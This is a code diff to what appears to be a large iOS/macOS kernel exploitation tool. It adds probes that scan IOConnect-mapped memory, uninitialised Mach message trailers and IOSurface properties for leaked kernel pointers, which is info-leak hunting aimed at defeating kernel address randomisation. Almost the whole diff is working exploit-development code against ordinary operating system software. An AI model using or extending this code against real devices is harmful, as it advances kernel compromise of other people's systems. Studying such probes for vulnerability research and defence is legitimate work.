@@ -48,6 +48,13 @@ extern kern_return_t mach_vm_region_recurse(
     vm_map_t target_task, mach_vm_address_t *address,
     mach_vm_size_t *size, natural_t *nesting_depth,
     vm_region_recurse_info_t info, mach_msg_type_number_t *infoCnt);
+extern kern_return_t mach_vm_read(
+    vm_map_t target_task, mach_vm_address_t address,
+    mach_vm_size_t size, vm_offset_t *data,
+    mach_msg_type_number_t *dataCnt);
+extern kern_return_t mach_vm_deallocate(
+    vm_map_t target_task, mach_vm_address_t address,
+    mach_vm_size_t size);
 extern kern_return_t mach_make_memory_entry_64(
     vm_map_t target_task, memory_object_size_t *size,
     memory_object_offset_t offset, vm_prot_t permission,
@@ -17690,6 +17697,188 @@ new_modes:
             rlog("  mach_port_kobject(thread): kr=%d type=%u addr=0x%llx\n",
                  kr240, kotype, (unsigned long long)koaddr);
 
+            /* Probe 13: IOKit registry properties */
+            rlog("\n  === IOKit Registry Property Scan ===\n");
+            {
+                CFMutableDictionaryRef regProps = NULL;
+                kr240 = IORegistryEntryCreateCFProperties(svc240, &regProps,
+                    kCFAllocatorDefault, 0);
+                if (kr240 == 0 && regProps) {
+                    CFIndex rcnt = CFDictionaryGetCount(regProps);
+                    rlog("  IOSurfaceRoot registry props: %ld entries\n", (long)rcnt);
+                    const void **rkeys = malloc(sizeof(void*) * rcnt);
+                    const void **rvals = malloc(sizeof(void*) * rcnt);
+                    CFDictionaryGetKeysAndValues(regProps, rkeys, rvals);
+                    for (CFIndex i = 0; i < rcnt && i < 50; i++) {
+                        char rkb[256]={0}, rvb[512]={0};
+                        CFStringRef rkd = CFCopyDescription(rkeys[i]);
+                        CFStringRef rvd = CFCopyDescription(rvals[i]);
+                        if (rkd) CFStringGetCString(rkd, rkb, sizeof(rkb), kCFStringEncodingUTF8);
+                        if (rvd) CFStringGetCString(rvd, rvb, sizeof(rvb), kCFStringEncodingUTF8);
+                        rlog("    reg[%ld] %s = %.200s\n", (long)i, rkb, rvb);
+                        if (rkd) CFRelease(rkd);
+                        if (rvd) CFRelease(rvd);
+                    }
+                    free(rkeys); free(rvals);
+                    CFRelease(regProps);
+                } else {
+                    rlog("  IORegistryEntryCreateCFProperties: kr=%d\n", kr240);
+                }
+                
+                io_registry_entry_t parent = 0;
+                kr240 = IORegistryEntryGetParentEntry(svc240, kIOServicePlane, &parent);
+                rlog("  Parent entry: kr=%d entry=0x%x\n", kr240, parent);
+                if (kr240 == 0 && parent) {
+                    CFMutableDictionaryRef pprops = NULL;
+                    IORegistryEntryCreateCFProperties(parent, &pprops, kCFAllocatorDefault, 0);
+                    if (pprops) {
+                        CFIndex pcnt = CFDictionaryGetCount(pprops);
+                        rlog("  Parent registry props: %ld entries\n", (long)pcnt);
+                        const void **pkeys = malloc(sizeof(void*) * pcnt);
+                        const void **pvals = malloc(sizeof(void*) * pcnt);
+                        CFDictionaryGetKeysAndValues(pprops, pkeys, pvals);
+                        for (CFIndex i = 0; i < pcnt && i < 50; i++) {
+                            char pkb[256]={0}, pvb[512]={0};
+                            CFStringRef pkd = CFCopyDescription(pkeys[i]);
+                            CFStringRef pvd = CFCopyDescription(pvals[i]);
+                            if (pkd) CFStringGetCString(pkd, pkb, sizeof(pkb), kCFStringEncodingUTF8);
+                            if (pvd) CFStringGetCString(pvd, pvb, sizeof(pvb), kCFStringEncodingUTF8);
+                            rlog("    parent[%ld] %s = %.200s\n", (long)i, pkb, pvb);
+                            if (pkd) CFRelease(pkd);
+                            if (pvd) CFRelease(pvd);
+                        }
+                        free(pkeys); free(pvals);
+                        CFRelease(pprops);
+                    }
+                    IOObjectRelease(parent);
+                }
+            }
+            
+            /* Probe 14: IOConnectMapMemory */
+            rlog("\n  === IOConnectMapMemory Probe ===\n");
+            for (uint32_t memtype = 0; memtype < 10; memtype++) {
+                mach_vm_address_t mapaddr = 0;
+                mach_vm_size_t mapsize = 0;
+                kr240 = IOConnectMapMemory64(conn240, memtype, mach_task_self(),
+                    &mapaddr, &mapsize, kIOMapAnywhere);
+                if (kr240 == 0 && mapsize > 0) {
+                    rlog("  MapMemory type=%u: addr=0x%llx size=0x%llx\n",
+                         memtype, (unsigned long long)mapaddr, (unsigned long long)mapsize);
+                    uint64_t *mp = (uint64_t*)mapaddr;
+                    int found = 0;
+                    for (size_t j = 0; j < mapsize/8 && j < 1024; j++) {
+                        uint64_t v = mp[j];
+                        if ((v & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL) {
+                            rlog("    KPTR at +%zu: 0x%016llx\n", j*8, v);
+                            found++;
+                            if (found >= 10) break;
+                        }
+                    }
+                    if (!found) {
+                        rlog("    First 8 qwords:");
+                        for (int k = 0; k < 8 && k < (int)(mapsize/8); k++)
+                            rlog(" 0x%llx", mp[k]);
+                        rlog("\n");
+                    }
+                    IOConnectUnmapMemory64(conn240, memtype, mach_task_self(), mapaddr);
+                }
+            }
+            
+            /* Probe 15: Mach message uninit leak */
+            rlog("\n  === Mach Message Uninit Leak Probe ===\n");
+            {
+                mach_port_t probe_port;
+                kr240 = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &probe_port);
+                kr240 = mach_port_insert_right(mach_task_self(), probe_port, probe_port,
+                    MACH_MSG_TYPE_MAKE_SEND);
+                
+                struct { mach_msg_header_t hdr; char body[64]; } send_msg;
+                memset(&send_msg, 0, sizeof(send_msg));
+                send_msg.hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
+                send_msg.hdr.msgh_size = sizeof(send_msg);
+                send_msg.hdr.msgh_remote_port = probe_port;
+                send_msg.hdr.msgh_local_port = MACH_PORT_NULL;
+                memset(send_msg.body, 0x41, 64);
+                
+                kr240 = mach_msg(&send_msg.hdr, MACH_SEND_MSG, sizeof(send_msg),
+                    0, MACH_PORT_NULL, 0, MACH_PORT_NULL);
+                rlog("  Send msg: kr=%d\n", kr240);
+                
+                struct {
+                    mach_msg_header_t hdr;
+                    char body[64];
+                    mach_msg_trailer_t trailer;
+                    char extra[4096];
+                } recv_msg;
+                memset(&recv_msg, 0xDD, sizeof(recv_msg));
+                
+                kr240 = mach_msg(&recv_msg.hdr, MACH_RCV_MSG | MACH_RCV_LARGE |
+                    MACH_RCV_TRAILER_TYPE(MACH_MSG_TRAILER_FORMAT_0) |
+                    MACH_RCV_TRAILER_ELEMENTS(MACH_RCV_TRAILER_AUDIT),
+                    0, sizeof(recv_msg), probe_port, 1000, MACH_PORT_NULL);
+                rlog("  Recv msg: kr=%d size=%u\n", kr240, recv_msg.hdr.msgh_size);
+                
+                if (kr240 == 0) {
+                    size_t trailer_off = recv_msg.hdr.msgh_size;
+                    uint8_t *raw = (uint8_t*)&recv_msg;
+                    rlog("  Trailer offset: %zu\n", trailer_off);
+                    for (size_t j = trailer_off; j + 8 <= sizeof(recv_msg) && j < trailer_off + 256; j += 8) {
+                        uint64_t v = *(uint64_t*)(raw + j);
+                        if (v != 0 && v != 0xDDDDDDDDDDDDDDDDULL) {
+                            rlog("    +%zu: 0x%016llx", j, v);
+                            if ((v & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL)
+                                rlog(" *** KPTR ***");
+                            rlog("\n");
+                        }
+                    }
+                }
+                mach_port_deallocate(mach_task_self(), probe_port);
+            }
+            
+            /* Probe 16: IOSurface property round-trip */
+            rlog("\n  === IOSurface Property Round-Trip ===\n");
+            {
+                char val_buf[256];
+                memset(val_buf, 0x58, sizeof(val_buf));
+                CFDataRef setData = CFDataCreate(NULL, (uint8_t*)val_buf, 256);
+                IOSurfaceSetValue(surf240, CFSTR("TestProp1"), setData);
+                CFRelease(setData);
+                
+                CFTypeRef gotVal = IOSurfaceCopyValue(surf240, CFSTR("TestProp1"));
+                if (gotVal && CFGetTypeID(gotVal) == CFDataGetTypeID()) {
+                    CFDataRef gotData = (CFDataRef)gotVal;
+                    CFIndex glen = CFDataGetLength(gotData);
+                    rlog("  Set 256 bytes, got back %ld bytes\n", (long)glen);
+                    if (glen > 256) {
+                        const uint8_t *gp = CFDataGetBytePtr(gotData);
+                        rlog("  EXTRA DATA beyond 256:\n");
+                        for (CFIndex i = 256; i < glen && i < 320; i += 8) {
+                            rlog("    +%ld: 0x%016llx\n", (long)i, *(uint64_t*)(gp + i));
+                        }
+                    }
+                }
+                if (gotVal) CFRelease(gotVal);
+                
+                const char *special_keys[] = {
+                    "IOSurfaceAllocSize", "IOSurfaceAddress", "IOSurfaceKernelAddress",
+                    "IOSurfaceRegistryID", "IOSurfaceIsGlobal", "IOSurfaceBulkAttachments",
+                    "IOSurfaceColorSpace", "IOSurfaceCacheMode", NULL
+                };
+                for (int k = 0; special_keys[k]; k++) {
+                    CFStringRef skey = CFStringCreateWithCString(NULL, special_keys[k], kCFStringEncodingUTF8);
+                    CFTypeRef sv = IOSurfaceCopyValue(surf240, skey);
+                    if (sv) {
+                        char svb[256] = {0};
+                        CFStringRef svd = CFCopyDescription(sv);
+                        if (svd) CFStringGetCString(svd, svb, sizeof(svb), kCFStringEncodingUTF8);
+                        rlog("  %s = %.200s\n", special_keys[k], svb);
+                        if (svd) CFRelease(svd);
+                        CFRelease(sv);
+                    }
+                    CFRelease(skey);
+                }
+            }
+            
             CFRelease(p240); CFRelease(w240r); CFRelease(h240r);
             CFRelease(b240r); CFRelease(a240r); CFRelease(f240r);
             if (svc240) IOObjectRelease(svc240);
